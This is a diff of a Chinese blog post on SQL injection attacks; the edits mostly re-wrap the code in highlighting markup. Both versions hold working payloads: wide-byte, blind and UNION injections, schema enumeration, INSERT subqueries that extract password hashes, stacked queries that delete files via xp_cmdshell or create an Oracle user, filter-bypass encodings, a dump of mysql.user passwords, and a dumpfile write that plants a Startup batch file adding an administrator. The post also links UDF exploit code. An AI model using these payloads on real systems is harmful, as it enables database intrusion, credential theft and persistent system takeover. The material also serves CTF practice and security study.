@@ -128,7 +128,7 @@
 <meta property="og:description" content="SQL注入攻击 宽字节注入  &amp;emsp;&amp;emsp;宽字节注入原理： &amp;emsp;&amp;emsp;GBK 占用两字节，ASCII占用一字节。PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。 &amp;emsp;&amp;emsp;在客户端输入字符&amp;#39;被PHP转义成\&amp;#39;，\&amp;#39;编码是%5c%27。">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://cloudofzm.cn/2018/04/22/SQLInjectionAttack/1.png">
-<meta property="og:updated_time" content="2018-05-01T09:22:21.000Z">
+<meta property="og:updated_time" content="2018-05-01T10:00:47.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入攻击">
 <meta name="twitter:description" content="SQL注入攻击 宽字节注入  &amp;emsp;&amp;emsp;宽字节注入原理： &amp;emsp;&amp;emsp;GBK 占用两字节，ASCII占用一字节。PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。 &amp;emsp;&amp;emsp;在客户端输入字符&amp;#39;被PHP转义成\&amp;#39;，\&amp;#39;编码是%5c%27。">
@@ -430,34 +430,16 @@
 <p>&emsp;&emsp;<strong>例：</strong></p>
 <p>&emsp;&emsp;BugkuCTF–sql注入:<a href="http://103.238.227.13:10083/" target="_blank" rel="noopener">http://103.238.227.13:10083/</a></p>
 <p>&emsp;&emsp;使用<code>&#39;</code>没有反应，于是猜测是宽字节注入。</p>
-<p>&emsp;&emsp;这道题里面还有一个知识点（keng）就是<code>key</code>是MYSQL的关键字，直接使用会报错。MYSQL提供了一个转义符号 &#96; 来区别关键词和库表字段名。</p>
-<pre><code>id=1%df%27%20union%20select%200,string%20from%20`key`%23
-id=1%df&apos; union select 0,string from `key`#
-</code></pre><hr>
+<p>&emsp;&emsp;这道题里面还有一个知识点（keng）就是<code>key</code>是MYSQL的关键字，直接使用会报错。MYSQL提供了一个转义符号 &#96; 来区别关键词和库表字段名。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>%df%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">200</span>,<span class="type">string</span>%<span class="number">20</span>from%<span class="number">20</span>`<span class="type">key</span>`%<span class="number">23</span></span><br><span class="line">id=<span class="number">1</span>%df' union select <span class="number">0</span>,<span class="type">string</span> from `<span class="type">key</span>`#</span><br></pre></td></tr></table></figure></p>
+<hr>
 <ul>
 <li><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4></li>
 </ul>
 <p>&emsp;&emsp;盲注应用于存在SQL注入漏洞，但是页面没有显示报错信息，或者网站过滤了部分特定字段，如<code>union</code>。盲注可以通过页面返回信息的正确与否判断语句是否正确。</p>
 <p>&emsp;&emsp;盲注分为两种：布尔和延时盲注。</p>
-<p>&emsp;&emsp;常用函数：</p>
-<pre><code>Length()        返回字符串的长度
-limit num,num   限制返回数据条数
-Substr()        截取字符串
-Ascii()         返回字符的ascii码
-sleep(n)        将程序挂起一段时间 n为n秒
-if(expr1,expr2,expr3)
-                判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
-</code></pre><p>&emsp;&emsp;构造语句：</p>
-<pre><code>## 布尔盲注：
-AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; &apos;A&apos; ## 表名
-AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; &apos;A&apos; ## 列名
-
-1&apos; and (ascii(substr(database(),1,1)))=115 --+
-1&apos; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100 --+
-
-## 延时盲注：
-1&apos; and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null))  --+ 
-</code></pre><p>&emsp;&emsp;<strong>例：</strong></p>
+<p>&emsp;&emsp;常用函数：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">Length</span><span class="params">()</span></span>        返回字符串的长度</span><br><span class="line">limit num,num   限制返回数据条数</span><br><span class="line"><span class="function"><span class="title">Substr</span><span class="params">()</span></span>        截取字符串</span><br><span class="line"><span class="function"><span class="title">Ascii</span><span class="params">()</span></span>         返回字符的ascii码</span><br><span class="line"><span class="function"><span class="title">sleep</span><span class="params">(n)</span></span>        将程序挂起一段时间 n为n秒</span><br><span class="line"><span class="function"><span class="title">if</span><span class="params">(expr1,expr2,expr3)</span></span></span><br><span class="line">                判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;构造语句：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">## 布尔盲注：</span><br><span class="line">AND SELECT SUBSTR(table_name,<span class="number">1</span>,<span class="number">1</span>) FROM information_schema.tables &gt; 'A' ## 表名</span><br><span class="line">AND SELECT SUBSTR(column_name,<span class="number">1</span>,<span class="number">1</span>) FROM information_schema.columns &gt; 'A' ## 列名</span><br><span class="line">    </span><br><span class="line"><span class="number">1</span>' and (ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">115</span> --+</span><br><span class="line"><span class="number">1</span>' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))&gt;<span class="number">100</span> --+</span><br><span class="line">    </span><br><span class="line">## 延时盲注：</span><br><span class="line"><span class="number">1</span>' and (if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">100</span>,sleep(<span class="number">10</span>),null))  --+</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;<strong>例：</strong></p>
 <p>&emsp;&emsp;DDCTF-2018–数据库的秘密：<a href="http://116.85.43.88:8080/ZVDHKBUVUZSTJCNX/dfe3ia/index.php" target="_blank" rel="noopener">http://116.85.43.88:8080/ZVDHKBUVUZSTJCNX/dfe3ia/index.php</a></p>
 <p>&emsp;&emsp;<a href="https://hwhehr.github.io/2018/04/21/DDCTF-2018/" target="_blank" rel="noopener">数据库的秘密</a></p>
 <hr>
@@ -468,35 +450,17 @@ AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; &apos;A&
 <p>&emsp;&emsp; ◦ <em>两个查询返回的列数必须相同；</em></p>
 <p>&emsp;&emsp; ◦ <em>两个SELECT语句对应列返回的数据类型必须相同（或至少是兼容的）。</em></p>
 <p>&emsp;&emsp;所以用<code>UNOION</code>构造SQL语句的时候需要进行两部猜解：匹配列数与匹配数据类型。</p>
-<h5 id="1-匹配列"><a href="#1-匹配列" class="headerlink" title="1. 匹配列"></a>1. 匹配列</h5><p>&emsp;&emsp;一种方法是一位一位的尝试；</p>
-<pre><code>1 union select null--
-1 union select null,null--
-1 union select null,null,null--
-</code></pre><p>&emsp;&emsp;还有一种方法是使用使用<code>order by</code>子句查询，当列数很多的时候，这种方法会在数据库中报错更少，留下痕迹更少。</p>
-<pre><code>1 order by 8    ### 不报错
-1 order by 16   ### 报错
-1 order by 12   ### 不报错
-1 order by 14   ### 报错
-1 order by 13   ### 不报错，所以得到结果列数是13
-</code></pre><h5 id="2-匹配数据类型"><a href="#2-匹配数据类型" class="headerlink" title="2.匹配数据类型"></a>2.匹配数据类型</h5><pre><code>1 union select &apos;test&apos;,NULL,NULL,NULL--
-1 union select NULL,&apos;test&apos;,NULL,NULL--
-1 union select NULL,NULL,&apos;test&apos;,NULL--
-1 union select NULL,NULL,NULL,&apos;test&apos;--
-</code></pre><p>&emsp;&emsp;如此一位一位的测试来匹配数据类型。假如只有一位或者没有<code>str</code>数据类型时，可以采取以下方法；</p>
-<pre><code>SELECT NULL, system_user() + &apos;|&apos; + db_name(), NULL, NULL
-SELECT NULL, ascii(substr(system_user(),1,1)), NULL, NULL
-</code></pre><hr>
+<h5 id="1-匹配列"><a href="#1-匹配列" class="headerlink" title="1. 匹配列"></a>1. 匹配列</h5><p>&emsp;&emsp;一种方法是一位一位的尝试；<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">null</span>--</span></span><br><span class="line"><span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">null</span>,<span class="title">null</span>--</span></span><br><span class="line"><span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">null</span>,<span class="title">null</span>,<span class="title">null</span>--</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;还有一种方法是使用使用<code>order by</code>子句查询，当列数很多的时候，这种方法会在数据库中报错更少，留下痕迹更少。<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span>order by <span class="number">8</span>    ### 不报错</span><br><span class="line"><span class="symbol">1 </span>order by <span class="number">16</span>   ### 报错</span><br><span class="line"><span class="symbol">1 </span>order by <span class="number">12</span>   ### 不报错</span><br><span class="line"><span class="symbol">1 </span>order by <span class="number">14</span>   ### 报错</span><br><span class="line"><span class="symbol">1 </span>order by <span class="number">13</span>   ### 不报错，所以得到结果列数是<span class="number">13</span></span><br></pre></td></tr></table></figure></p>
+<h5 id="2-匹配数据类型"><a href="#2-匹配数据类型" class="headerlink" title="2.匹配数据类型"></a>2.匹配数据类型</h5><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> '<span class="title">test</span>',<span class="title">NULL</span>,<span class="title">NULL</span>,<span class="title">NULL</span>--</span></span><br><span class="line"><span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">NULL</span>,'<span class="title">test</span>',<span class="title">NULL</span>,<span class="title">NULL</span>--</span></span><br><span class="line"><span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">NULL</span>,<span class="title">NULL</span>,'<span class="title">test</span>',<span class="title">NULL</span>--</span></span><br><span class="line"><span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">NULL</span>,<span class="title">NULL</span>,<span class="title">NULL</span>,'<span class="title">test</span>'--</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;如此一位一位的测试来匹配数据类型。假如只有一位或者没有<code>str</code>数据类型时，可以采取以下方法；<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="literal">NULL</span>, <span class="keyword">system_user</span>() + <span class="string">'|'</span> + db_name(), <span class="literal">NULL</span>, <span class="literal">NULL</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="literal">NULL</span>, <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">system_user</span>(),<span class="number">1</span>,<span class="number">1</span>)), <span class="literal">NULL</span>, <span class="literal">NULL</span></span><br></pre></td></tr></table></figure></p>
+<hr>
 <ul>
 <li><h4 id="枚举数据库"><a href="#枚举数据库" class="headerlink" title="枚举数据库"></a>枚举数据库</h4></li>
 </ul>
 <p>&emsp;&emsp;在SQL Server、MySQL以及Oracle等数据库中，都有会有一个库存有所有库的库名，以及其中的表名和列名。可以通过这项特性查询到敏感的或者我们感兴趣的一些数据库。</p>
-<p>&emsp;&emsp;以MySQL为例：</p>
-<pre><code>select schema_name from information_schema.schemata;    ###所有库名
-select table_name from information_schema.tables;       ###所有表名
-select column_name from information_schema.columns;     ###所有列名
-
-select table_schema,table_name,column_name from information_schema.columns #查询所有库表列的从属关系
-</code></pre><p>&emsp;&emsp;<code>information_schema</code>不仅包含了数据库结构，还包含与数据库用户权限及其得到的授权信息。例如：</p>
+<p>&emsp;&emsp;以MySQL为例：<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select schema_name <span class="keyword">from</span> information_schema.schemata;    ###所有库名</span><br><span class="line">select table_name <span class="keyword">from</span> information_schema.tables;       ###所有表名</span><br><span class="line">select column_name <span class="keyword">from</span> information_schema.columns;     ###所有列名</span><br><span class="line">    </span><br><span class="line">select table_schema,table_name,column_name <span class="keyword">from</span> information_schema.columns #查询所有库表列的从属关系</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;<code>information_schema</code>不仅包含了数据库结构，还包含与数据库用户权限及其得到的授权信息。例如：</p>
 <pre><code>SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;
 </code></pre><p>&emsp;&emsp;若想知道不同数据库授权用户权限，可以使用下列查询：</p>
 <pre><code>SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges;
@@ -507,29 +471,17 @@ select table_schema,table_name,column_name from information_schema.columns #查�
 <p>&emsp;&emsp;<strong>1.插入用户规定数据</strong></p>
 <p>&emsp;&emsp;假定服务端构造的SQL语句是这样的：</p>
 <pre><code>INSERT INTO table (firstname, lastname) VALUES (&apos;$firstname&apos;,&apos;$lastname&apos;)
-</code></pre><p>&emsp;&emsp;可以构造这样的语句：</p>
-<pre><code>INSERT INTO table (firstname, lastname) VALUES (&apos;
-
-first&apos;,(SELECT name + &apos; | &apos; + master.sys.fn varbintohexstr(password hash) from sys.sql logins))-- 
-
-&apos;,&apos;last&apos;) 
-
-INSERT INTO table (firstname, lastname) VALUES (&apos;first&apos;,(SELECT name + &apos; | &apos; + master.sys.fn_varbintohexstr(password hash) from sys.sql logins))-- &apos;,&apos;last&apos;)
-</code></pre><p>&emsp;&emsp;这条语句执行了下列几个操作：</p>
+</code></pre><p>&emsp;&emsp;可以构造这样的语句：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">table</span> (firstname, lastname) <span class="keyword">VALUES</span> (<span class="string">'</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">first'</span>,(<span class="keyword">SELECT</span> <span class="keyword">name</span> + <span class="string">' | '</span> + master.sys.fn varbintohexstr(<span class="keyword">password</span> <span class="keyword">hash</span>) <span class="keyword">from</span> sys.sql logins))<span class="comment">-- </span></span><br><span class="line">    </span><br><span class="line"><span class="string">','</span><span class="keyword">last</span><span class="string">') </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">INSERT INTO table (firstname, lastname) VALUES ('</span><span class="keyword">first</span><span class="string">',(SELECT name + '</span> | <span class="string">' + master.sys.fn_varbintohexstr(password hash) from sys.sql logins))-- '</span>,<span class="string">'last'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;这条语句执行了下列几个操作：</p>
 <p>&emsp;&emsp;1.插入任意值并且使用单引号关闭该字符串；</p>
 <p>&emsp;&emsp;2.为了在第二列插入数据，语句注入了一个子查询，该查询将第一个数据库用户的用户名和密码的哈希连接成一个字符串。其中还使用<code>fn_varbintohexstr()</code>函数将二进制的哈希值转换为十六进制格式。</p>
 <p>&emsp;&emsp;3.关闭了所有需要关闭的圆括号，并注释掉其余的查询。</p>
 <p>&emsp;&emsp;但是当可注入的参数是最后一个参数时，就很麻烦了，因为无法关闭前面一个参数，去构造下一个参数。在MySQL处于ANSI模式（或者任何实现了<code>PIPES_AS_QUOTES</code>的其他模式）时，可以用<code>||</code>符号拼接字符：</p>
 <pre><code>INSERT INTO table (firstname, lastname) VALUES (&apos;firstname&apos;,&apos;lastname&apos; || (select @@version)) --
 </code></pre><p>&emsp;&emsp;但是在<code>PIPES_AS_QUOTES</code>时（比如<code>TRADITIONAL</code>模式），那么<code>||</code>操作符会被当成<code>OR</code>逻辑符号。</p>
-<p>&emsp;&emsp;于是我们可以运用MySQL的一个特性，当一个整数与一个字符相加时，整数拥有更高的优先级：</p>
-<pre><code>mysql&gt; select &apos;a&apos; + 1;
-output: 1
-</code></pre><p>&emsp;&emsp;接下来就可以使用<code>ascii</code>，<code>substring</code>等函数进行注入。</p>
-<pre><code>INSERT INTO table (col1, col2) VALUES (&apos;foo&apos;, &apos;bar&apos;+/**/ascii(substring(user(),1,1))+&apos;&apos;)
-INSERT INTO table (col1, col2) VALUES (&apos;foo&apos;, &apos;bar&apos;+/**/ascii(substring(user(),2,1))+&apos;&apos;)
-INSERT INTO table (col1, col2) VALUES (&apos;foo&apos;, &apos;bar&apos;+/**/ascii(substring(user(),3,1))+&apos;&apos;)
-</code></pre><p>&emsp;&emsp;<strong>2.</strong> 生成<code>INSERT</code>错误</p>
+<p>&emsp;&emsp;于是我们可以运用MySQL的一个特性，当一个整数与一个字符相加时，整数拥有更高的优先级：<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="built_in">select</span> <span class="string">'a'</span> + <span class="number">1</span>;</span><br><span class="line"><span class="built_in">output</span>: <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;接下来就可以使用<code>ascii</code>，<code>substring</code>等函数进行注入。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table (<span class="name">col1</span>, col2) VALUES ('foo', 'bar'+/**/ascii(<span class="name">substring</span>(<span class="name">user</span>(),<span class="number">1</span>,<span class="number">1</span>))+'')</span><br><span class="line">INSERT INTO table (<span class="name">col1</span>, col2) VALUES ('foo', 'bar'+/**/ascii(<span class="name">substring</span>(<span class="name">user</span>(),<span class="number">2</span>,<span class="number">1</span>))+'')</span><br><span class="line">INSERT INTO table (<span class="name">col1</span>, col2) VALUES ('foo', 'bar'+/**/ascii(<span class="name">substring</span>(<span class="name">user</span>(),<span class="number">3</span>,<span class="number">1</span>))+'')</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;<strong>2.</strong> 生成<code>INSERT</code>错误</p>
 <p>&emsp;&emsp;这种情况适用于返回报错的服务端，根据报错进行注入，常用到的关键字<code>IF</code>，<code>CASE</code>，这种情况现在应该不常遇到，就不码了。</p>
 <hr>
 <ul>
@@ -539,33 +491,21 @@ INSERT INTO table (col1, col2) VALUES (&apos;foo&apos;, &apos;bar&apos;+/**/asci
 <pre><code>1&apos;; exec master..xp_cmdshell &apos;DEL important_file.txt&apos; ### SQL Server
 </code></pre><p>&emsp;&emsp;但并非所有数据库服务平台都支持堆叠查询，根据远程数据库服务器的差别和所使用的技术框架不同，情况各有不同。例如，使用 ASP.NET 和 PHP 访问 Microsoft SQL Server 时允许堆叠查询，但是如果使用Java来访问，就不允许。使用PHP访问PostgreSQL时，PHP允许堆叠查询；但是如果访问MySQL，PHP不允许堆叠查询。</p>
 <p><img src="/2018/04/22/SQLInjectionAttack/1.png" alt="image"></p>
-<p>&emsp;&emsp;在Oracle数据库中有一个特殊的堆叠注入的漏洞，Oracle SQL语句是不允许执行堆叠查询的。所以需要执行PL/SQL块，PL/SQL程序设计语言是直接内置于Oracle中，可以使用一个匿名PL/SQL块，它包含在一条BEGIN语句与一条END语句之间。</p>
-<pre><code>SQL&gt; DECLARE
-MESG VARCHAR(200);
-BEGIN
-MESG:=&apos;HELLO WORLD&apos;;
-DBMS_OUTPUT.PUT_LINE(MESG);
-END;
-/
-</code></pre><p>&emsp;&emsp;在安装Oracle时一起安装了一些默认包，在<code>8i</code>到<code>11g R2</code>等版本中安装了两个允许匿名PL/SQL块的函数：</p>
-<pre><code>dbms_xmlquery.newcontext()
-dbms_xmlquery.getxml()
-</code></pre><p>&emsp;&emsp;用户基本都有权限访问这两个函数，可以使用这两个函数执行DML/DDL语句块，例：</p>
+<p>&emsp;&emsp;在Oracle数据库中有一个特殊的堆叠注入的漏洞，Oracle SQL语句是不允许执行堆叠查询的。所以需要执行PL/SQL块，PL/SQL程序设计语言是直接内置于Oracle中，可以使用一个匿名PL/SQL块，它包含在一条BEGIN语句与一条END语句之间。<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; <span class="keyword">DECLARE</span></span><br><span class="line">MESG VARCHAR(<span class="number">200</span>);</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">MESG:=<span class="symbol">'HELLO</span> WORLD';</span><br><span class="line">DBMS_OUTPUT.PUT_LINE(MESG);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">/</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;在安装Oracle时一起安装了一些默认包，在<code>8i</code>到<code>11g R2</code>等版本中安装了两个允许匿名PL/SQL块的函数：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">dbms_xmlquery</span><span class="selector-class">.newcontext</span>()</span><br><span class="line"><span class="selector-tag">dbms_xmlquery</span><span class="selector-class">.getxml</span>()</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;用户基本都有权限访问这两个函数，可以使用这两个函数执行DML/DDL语句块，例：</p>
 <pre><code>id=1 and (select dbms_xmlquery.newcontext(&apos;declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate &apos;&apos;create user pwned identified by pwn3d &apos;&apos;; commit; end;&apos;) from dual) is not null --
 </code></pre><hr>
 <ul>
 <li><h4 id="绕过过滤器的一些姿势"><a href="#绕过过滤器的一些姿势" class="headerlink" title="绕过过滤器的一些姿势"></a>绕过过滤器的一些姿势</h4></li>
 </ul>
 <p>&emsp;&emsp;<strong>1. 使用大小写变种</strong></p>
-<pre><code>UNION SELECT password FROM table WHERE username=&apos;admin&apos;--
-uNiOn SElEct password FrOm table WhErE username=&apos;admin&apos;--
-</code></pre><p>&emsp;&emsp;<strong>2. 使用SQL注释</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION <span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> username=<span class="string">'admin'</span><span class="comment">--</span></span><br><span class="line"><span class="keyword">uNiOn</span> <span class="keyword">SElEct</span> <span class="keyword">password</span> <span class="keyword">FrOm</span> <span class="keyword">table</span> <span class="keyword">WhErE</span> username=<span class="string">'admin'</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;<strong>2. 使用SQL注释</strong></p>
 <pre><code>&apos;/**/UNION/**/SELECT/**/password/**/FROM/**/table/**/WHERE/**/username/**/LIKE/**/&apos;admin&apos;--
 </code></pre><p>&emsp;&emsp;<strong>3. 使用URL编码</strong></p>
-<pre><code>%2f =&gt; / | %2a =&gt; * | %25 =&gt; %
-&apos;%2f%2a*/UNION%2f%2a*/SELECT%2f%2a*/password%2f%2a*/FROM%2f%2a*/table%2f%2a*/WHERE%2f%2a*/username%2f%2a*/LIKE%2f%2a*/&apos;admin&apos;--
-&apos;%252f%252a*/UNION%252f%252a*/SELECT%252f%252a*/password%252f%252a*/FROM%252f%252a*/table%252f%252a*/WHERE%252f%252a*/username%252f%252a*/LIKE%252f%252a*/&apos;admin&apos;--
-</code></pre><p>&emsp;&emsp;<strong>4. 使用动态查询执行</strong></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">%2</span>f =&gt; / | <span class="symbol">%2</span>a =&gt; * | <span class="symbol">%25</span> =&gt; %</span><br><span class="line">'<span class="symbol">%2</span>f<span class="symbol">%2</span>a*/UNION<span class="symbol">%2</span>f<span class="symbol">%2</span>a*/SELECT<span class="symbol">%2</span>f<span class="symbol">%2</span>a*/password<span class="symbol">%2</span>f<span class="symbol">%2</span>a*/FROM<span class="symbol">%2</span>f<span class="symbol">%2</span>a*/table<span class="symbol">%2</span>f<span class="symbol">%2</span>a*/WHERE<span class="symbol">%2</span>f<span class="symbol">%2</span>a*/username<span class="symbol">%2</span>f<span class="symbol">%2</span>a*/LIKE<span class="symbol">%2</span>f<span class="symbol">%2</span>a*/'admin'--</span><br><span class="line">'<span class="symbol">%252</span>f<span class="symbol">%252</span>a*/UNION<span class="symbol">%252</span>f<span class="symbol">%252</span>a*/SELECT<span class="symbol">%252</span>f<span class="symbol">%252</span>a*/password<span class="symbol">%252</span>f<span class="symbol">%252</span>a*/FROM<span class="symbol">%252</span>f<span class="symbol">%252</span>a*/table<span class="symbol">%252</span>f<span class="symbol">%252</span>a*/WHERE<span class="symbol">%252</span>f<span class="symbol">%252</span>a*/username<span class="symbol">%252</span>f<span class="symbol">%252</span>a*/LIKE<span class="symbol">%252</span>f<span class="symbol">%252</span>a*/'admin'--</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;<strong>4. 使用动态查询执行</strong></p>
 <p>&emsp;&emsp;这种方法主要运用在Oracle、SQL Server等数据库中，具体不清楚怎么使用，先码在这。</p>
 <p>&emsp;&emsp;当SELECT被过滤的时候可以使用 <code>&#39;SEL&#39;||&#39;ECT&#39;</code> <code>CHAR(83) +CHAR(69) +CHAR(76) +CHAR(69) +CHAR(67) +CHAR(84)</code></p>
 <p>&emsp;&emsp;MySQL中可以用 <code>WHERE data = 0x64617461</code> 代替 <code>WHERE data = &#39;data&#39;</code></p>
@@ -678,30 +618,26 @@ uNiOn SElEct password FrOm table WhErE username=&apos;admin&apos;--
 </tr>
 </tbody>
 </table>
-<pre><code>select schema_name from information_schema.schemata;    ###所有库名
-select table_name from information_schema.tables;       ###所有表名
-select column_name from information_schema.columns;     ###所有列名
-</code></pre><!---->
-<p>&emsp;&emsp;<strong>执行系统命令：</strong></p>
-<pre><code># 从MySQL中读取内容并将其写入本地中（例：用于创建一个定期执行的恶意脚本文件）：
-SELECT &apos;system_commands&apos; INTO dumpfile trojanpath
-
-# 在Windows启动目录中创建一个批处理文件，用于添加一个口令为x的管理员用户x：
-SELECT &apos;net user x x /add%26%26 net localgroup administrators x /add&apos; into dumpfile &apos;c:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Starup\\attack.bat&apos;
-</code></pre><p>&emsp;&emsp;<strong>查询数据库口令：</strong></p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select schema_name <span class="keyword">from</span> information_schema.schemata;    ###所有库名</span><br><span class="line">select table_name <span class="keyword">from</span> information_schema.tables;       ###所有表名</span><br><span class="line">select column_name <span class="keyword">from</span> information_schema.columns;     ###所有列名</span><br></pre></td></tr></table></figure>
+<!---->
+<p>&emsp;&emsp;<strong>执行系统命令：</strong><br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 从MySQL中读取内容并将其写入本地中（例：用于创建一个定期执行的恶意脚本文件）：</span><br><span class="line">SELECT 'system_commands' INTO dumpfile trojanpath</span><br><span class="line">    </span><br><span class="line"># 在Windows启动目录中创建一个批处理文件，用于添加一个口令为<span class="keyword">x</span>的管理员用户<span class="keyword">x</span>：</span><br><span class="line">SELECT 'net user <span class="keyword">x</span> <span class="keyword">x</span> /<span class="keyword">add</span><span class="symbol">%26</span><span class="symbol">%26</span> net localgroup administrators <span class="keyword">x</span> /<span class="keyword">add</span>' into dumpfile '<span class="keyword">c</span>:\\Documents <span class="keyword">and</span> Settings\\All Users\\Start Menu\\Programs\\Starup\\attack.bat'</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;<strong>查询数据库口令：</strong></p>
 <pre><code>SELECT concat(user,&quot;:&quot;,password) FROM mysql.user
 </code></pre><p>&emsp;&emsp;<strong>直接攻击数据库：</strong></p>
 <p>&emsp;&emsp;通过直接连接数据库并创建用户自定义函数来执行代码。</p>
 <p>&emsp;&emsp;基于UNIX：<a href="raptor_udf.c">raptor_udf.c</a> | <a href="raptor_udf2.c">raptor_udf2.c</a></p>
 <p>&emsp;&emsp;基于Windows： <a href="raptor_winudf.zip">raptor_winudf.zip</a> （解压密码：0xdeadbeef）</p>
 <p>&emsp;&emsp;代码来自：<a href="http://www.0xdeadbeef.info" target="_blank" rel="noopener">0xdeadbeef.info</a></p>
-<p>&emsp;&emsp;<strong>读写文件：</strong></p>
-<pre><code># 读取文件
